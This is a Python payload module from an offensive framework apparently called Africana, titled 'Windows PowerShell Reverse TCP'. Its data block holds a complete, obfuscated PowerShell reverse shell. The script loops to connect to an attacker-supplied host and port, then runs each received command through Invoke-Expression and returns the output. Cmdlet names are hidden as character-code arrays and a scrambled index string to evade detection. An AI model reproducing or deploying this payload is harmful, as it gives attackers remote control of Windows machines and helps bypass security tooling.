# This module is part of the Africana framework

class Payload:

    info = {
        'Title' : 'Windows PowerShell Reverse TCP',
        'Author' : 'r0jahsm0ntar1',
        'Description' : 'Classic PowerShell Reverse TCP',
        'References' : ['https://github.com/r0jahsm0ntar1/africana-framework']
    }

    meta = {
        'handler' : 'netcat',
        'type' : 'powershell-reverse-tcp',
        'os' : 'windows'
    }

    config = {}

    parameters = {
        'lhost' : None
    }

    attrs = {
        'encode' : True
    }

    data = """
    do {
    & ([string]::join('', ( (83,116,97,114,116,45,83,108,101,101,112) |ForEach-Object{$($_)}|%{$($_)}|%{ ( [char][int] $_)})) |ForEach-Object{$($_)}|%{$($_)}| % {$_}) -Seconds 15
    try{
        $TCPClient = & ([string]::join('', ( (78,101,119,45,79,98,106,101,99,116) |ForEach-Object{$($_)}|%{$($_)}|%{ ( [char][int] $_)})) |ForEach-Object{$($_)}|%{$($_)}| % {$_}) Net.Sockets.TCPClient('*LHOST*', *LPORT*)
    } catch {}
} until ($TCPClient.Connected)
$NetworkStream = $TCPClient.GetStream()
$StreamWriter = & ([string]::join('', ( (78,101,119,45,79,98,106,101,99,116) |ForEach-Object{$_}|%{$($_)}|%{ ( [char][int] $($_))})) |ForEach-Object{$($_)}|%{$_}| % {$($_)}) IO.StreamWriter($NetworkStream)
function WriteToStream ($String) {
    [byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize |ForEach-Object{$_}|%{$_}| % {0}
    $StreamWriter.Write($String + 'PS ' + (& ([string]::join('', ( (71,101,116,45,76,111,99,97,116,105,111,110) |ForEach-Object{$($_)}|%{$_}|%{ ( [char][int] $($_))})) |ForEach-Object{$($_)}|%{$_}| % {$_})).Path + '> ')
    $StreamWriter.Flush()
}
WriteToStream ''
while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {   
    $Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1)
    $Output = try {
            & (("YBTE0Fdxf-IjCRsn6hZawLrzMeXyO285utcPkN9qbQ1DgpVlASHivK7oUGW4Jm3")[10,15,52,55,36,25,9,3,7,45,22,25,14,14,51,55,15] -join '') $Command 2>&1 |ForEach-Object{$_}|%{$($_)}| & ([string]::join('', ( (79,117,116,45,83,116,114,105,110,103) |ForEach-Object{$($_)}|%{$_}|%{ ( [char][int] $($_))})) |ForEach-Object{$_}|%{$_}| % {$($_)})
        } catch {
            $_ |ForEach-Object{$($_)}|%{$($_)}| & ([string]::join('', ( (79,117,116,45,83,116,114,105,110,103) |ForEach-Object{$($_)}|%{$($_)}|%{ ( [char][int] $($_))})) |ForEach-Object{$($_)}|%{$_}| % {$_})
        }
    WriteToStream ($Output)
}
$StreamWriter.Close()
"""
